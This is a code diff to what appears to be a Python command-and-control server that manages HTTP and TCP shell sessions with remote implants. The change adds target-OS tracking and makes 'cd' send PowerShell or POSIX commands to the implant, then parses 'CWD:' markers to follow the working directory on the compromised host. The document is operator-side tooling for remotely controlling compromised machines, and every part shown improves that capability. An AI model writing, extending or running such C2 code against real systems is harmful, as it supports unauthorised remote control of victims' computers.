@@ -128,6 +128,8 @@ HOST = None
 HTTP_PORT = None
 RAW_TCP_PORT = None
 IMPLANT_TIMEOUT = 30
+# Track selected OS to tailor HTTP command behavior
+OS_CHOICE = None
 
 http_sessions = {}
 shell_sessions = {}
@@ -203,15 +205,25 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                 http_sessions[uid]["output"] = decoded_output
                 http_sessions[uid]["last_seen"] = time.time()
                 http_sessions[uid]["has_new_output"] = True
-                # Update CWD heuristics without printing immediately; console will print after progress bar
-                clean = decoded_output.strip()
-                last_sent = http_sessions[uid].get("last_sent", "")
-                if "Get-Location" in last_sent or last_sent.strip().lower() == "pwd":
-                    lines = [ln for ln in clean.splitlines() if ln.strip()]
-                    if lines:
-                        candidate = lines[-1].strip()
-                        if re.match(r"^[A-Za-z]:\\", candidate) or candidate.startswith("\\") or candidate.startswith("/"):
-                            http_sessions[uid]["cwd"] = candidate
+                # Prefer explicit CWD marker if present, else use heuristics
+                clean = (decoded_output or "").strip()
+                # Marker form: CWD:<absolute_path>
+                marker_lines = [ln.strip() for ln in clean.splitlines() if ln.strip().startswith("CWD:")]
+                if marker_lines:
+                    try:
+                        last_marker = marker_lines[-1]
+                        _, path_val = last_marker.split(":", 1)
+                        http_sessions[uid]["cwd"] = path_val.strip()
+                    except Exception:
+                        pass
+                else:
+                    last_sent = http_sessions[uid].get("last_sent", "")
+                    if "Get-Location" in last_sent or last_sent.strip().lower() == "pwd":
+                        lines = [ln for ln in clean.splitlines() if ln.strip()]
+                        if lines:
+                            candidate = lines[-1].strip()
+                            if re.match(r"^[A-Za-z]:\\", candidate) or candidate.startswith("\\") or candidate.startswith("/"):
+                                http_sessions[uid]["cwd"] = candidate
 
         self._set_headers()
         self.wfile.write(b"OK")
@@ -447,10 +459,12 @@ def wait_for_http_response(uid: str, timeout_seconds: int = 15):
         sys.stdout.flush()
         time.sleep(0.1)
 
-    # Print the captured output after bar completes
-    clean = (output or "").strip()
-    if clean and clean != "OK":
-        sys.stdout.write(clean + "\n")
+    # Print the captured output after bar completes (strip control markers)
+    lines = (output or "").splitlines()
+    cleaned_lines = [ln for ln in lines if not (ln.strip().startswith("CWD:") or ln.strip() == "CDERR")]
+    clean_display = "\n".join(cleaned_lines).strip()
+    if clean_display and clean_display != "OK":
+        sys.stdout.write(clean_display + "\n")
     # Reset flags and repaint prompt
     with global_lock:
         if uid in http_sessions:
@@ -558,7 +572,9 @@ def c2_console():
                         if cmd_input.startswith("cd"):
                             parts = cmd_input.split(maxsplit=1)
                             if len(parts) == 1:
+                                # Reset to default CWD (no-op on target)
                                 http_sessions[uid]['cwd'] = None
+                                needs_wait = False
                             else:
                                 arg = parts[1].strip()
                                 if ((arg.startswith('"') and arg.endswith('"')) or (arg.startswith("'") and arg.endswith("'"))):
@@ -566,15 +582,30 @@ def c2_console():
                                 current_cwd = http_sessions[uid].get('cwd')
                                 is_absolute = bool(re.match(r'^[A-Za-z]:[\\/]', arg)) or arg.startswith('/') or arg.startswith('\\')
                                 if is_absolute or not current_cwd:
-                                    new_dir = arg
+                                    target_dir = arg
                                 else:
                                     sep = '\\' if ('\\' in current_cwd or re.match(r'^[A-Za-z]:', current_cwd)) else '/'
                                     if current_cwd.endswith(sep):
-                                        new_dir = f"{current_cwd}{arg}"
+                                        target_dir = f"{current_cwd}{arg}"
                                     else:
-                                        new_dir = f"{current_cwd}{sep}{arg}"
-                                http_sessions[uid]['cwd'] = new_dir
-                                needs_wait = False
+                                        target_dir = f"{current_cwd}{sep}{arg}"
+                                # Build a verification command for Windows PowerShell
+                                verify_cmd = None
+                                if OS_CHOICE == "Windows":
+                                    verify_cmd = (
+                                        f"$ErrorActionPreference='SilentlyContinue';"
+                                        f"Set-Location -Path \"{target_dir}\";"
+                                        f"if($?){{Write-Output \"CWD:\" + (Get-Location).Path}}else{{Write-Output \"CDERR\"}}"
+                                    )
+                                else:
+                                    # Generic POSIX fallback
+                                    verify_cmd = (
+                                        f"if [ -d \"{target_dir}\" ]; then cd \"{target_dir}\" && pwd | sed 's/^/CWD:/'; else echo CDERR; fi"
+                                    )
+                                http_sessions[uid]['last_cmd'] = verify_cmd
+                                http_sessions[uid]['has_new_output'] = False
+                                http_sessions[uid]['awaiting'] = True
+                                needs_wait = True
                         else:
                             cwd = http_sessions[uid].get('cwd')
                             to_send = f'cd "{cwd}"; {cmd_input}' if cwd else cmd_input
@@ -662,6 +693,9 @@ def main():
     HOST = lhost
     HTTP_PORT = http_port
     RAW_TCP_PORT = tcp_port
+    # store OS choice globally for later logic
+    global OS_CHOICE
+    OS_CHOICE = os_choice
 
     # start only the relevant listeners
     try:
